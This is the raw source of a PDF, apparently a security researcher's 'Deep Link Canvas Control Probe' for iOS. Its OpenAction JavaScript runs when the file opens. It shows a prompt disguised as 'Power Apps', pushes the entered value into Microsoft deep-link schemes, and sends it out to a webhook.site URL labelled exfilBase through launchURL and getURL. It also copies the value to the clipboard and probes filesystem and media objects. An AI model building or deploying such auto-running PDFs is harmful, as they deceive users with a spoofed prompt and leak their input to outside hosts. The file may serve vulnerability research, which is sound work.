%PDF-1.7
% Deep Link Canvas Control Probe - iOS - March 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (

        var results = [];

        // === STEP 1: CAPTURE TEST DATA ===
        var testData = app.response({
          cQuestion: "Enter any test value to probe canvas control:",
          cTitle: "Power Apps",
          cDefault: "test123"
        });

        if (testData !== null) {

          var payload = encodeURIComponent(testData);
          var exfilBase = "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce";

          // === STEP 2: POWERAPPS DEEP LINK SCHEMES ===
          results.push("=== PA SCHEMES ===");

          // Standard PowerApps deep link
          try {
            app.launchURL("powerapps://apps?Image=" + payload, false);
            results.push("powerapps://apps: no throw");
          } catch(e) { results.push("powerapps://apps: " + e); }

          // PowerApps open scheme
          try {
            app.launchURL("powerapps://open?controlName=Image5&value=" + payload, false);
            results.push("powerapps://open: no throw");
          } catch(e) { results.push("powerapps://open: " + e); }

          // ms-apps scheme
          try {
            app.launchURL("ms-apps://set?Image5=" + payload, false);
            results.push("ms-apps://set: no throw");
          } catch(e) { results.push("ms-apps://set: " + e); }

          // ms-powerplatform scheme
          try {
            app.launchURL("ms-powerplatform://control?name=Image5&src=" + payload, false);
            results.push("ms-powerplatform: no throw");
          } catch(e) { results.push("ms-powerplatform: " + e); }

          // msteams scheme (PowerApps runs in Teams)
          try {
            app.launchURL("msteams://l/entity?Image5=" + payload, false);
            results.push("msteams://: no throw");
          } catch(e) { results.push("msteams://: " + e); }

          // msauth scheme
          try {
            app.launchURL("msauth://set?control=Image5&value=" + payload, false);
            results.push("msauth://: no throw");
          } catch(e) { results.push("msauth://: " + e); }

          // === STEP 3: IMAGE SRC VARIANTS ===
          results.push("=== IMAGE SRC ===");

          // Try setting image field to webhook URL directly
          try {
            app.launchURL(exfilBase + "?t=imgsrc&v=" + payload, false);
            results.push("launchURL webhook: no throw");
          } catch(e) { results.push("launchURL webhook: " + e); }

          // getURL - different network path from submitForm
          try {
            app.getURL(exfilBase + "?t=geturl&v=" + payload, false);
            results.push("getURL: no throw");
          } catch(e) { results.push("getURL: " + e); }

          // === STEP 4: INTER-APP COMMUNICATION ===
          results.push("=== INTER-APP ===");

          // UIPasteboard - write to clipboard, readable by canvas
          try {
            app.setClipboard(testData);
            results.push("setClipboard: no throw");
          } catch(e) { results.push("setClipboard: " + e); }

          // app.media - another potential channel
          try {
            results.push("app.media: " + typeof app.media);
          } catch(e) { results.push("app.media: " + e); }

          // app.fs - filesystem channel
          try {
            results.push("app.fs: " + typeof app.fs);
          } catch(e) { results.push("app.fs: " + e); }

          // === STEP 5: EVENT DISPATCH ===
          results.push("=== EVENTS ===");

          // Can we dispatch events that canvas listens to?
          try {
            results.push("app.events: " + typeof app.events);
          } catch(e) { results.push("app.events: " + e); }

          try {
            this.disclosed = true;
            results.push("disclosed: set ok");
          } catch(e) { results.push("disclosed: " + e); }

          // === STEP 6: REPORT ===
          app.alert(results.join("\\n"));

        }

   )
>>
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
   /Resources 
     /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >>
   >>
>>
endobj

5 0 obj
<< /Length 90 >>
stream
BT /F1 14 Tf 50 250 Td (Deep Link Canvas Probe) Tj ET
BT /F1 12 Tf 50 220 Td (Watch Image5 and webhook) Tj ET
endstream
endobj

